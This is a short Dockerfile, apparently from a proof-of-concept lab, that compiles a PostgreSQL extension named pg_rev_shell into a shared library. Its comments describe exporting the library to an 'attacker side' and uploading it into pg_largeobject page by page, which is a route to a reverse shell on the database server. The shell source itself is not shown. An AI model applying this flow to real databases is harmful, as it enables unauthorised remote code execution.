FROM postgres:13 AS extension-builder

RUN set -eux; \
    apt-get update; \
    apt-get install -y --no-install-recommends \
        gcc \
        postgresql-server-dev-13; \
    rm -rf /var/lib/apt/lists/*

COPY extensions/pg_rev_shell.c /tmp/pg_rev_shell.c

RUN gcc -I$(pg_config --includedir-server) -shared -fPIC \
        -o /tmp/pg_rev_shell.so /tmp/pg_rev_shell.c

FROM postgres:13
# Hướng 2 now mirrors the manual PoC flow:
# the runtime image does not ship pg_rev_shell.so.
# Build the extension from the extension-builder target, export it to the
# attacker side, then upload it into pg_largeobject page by page.
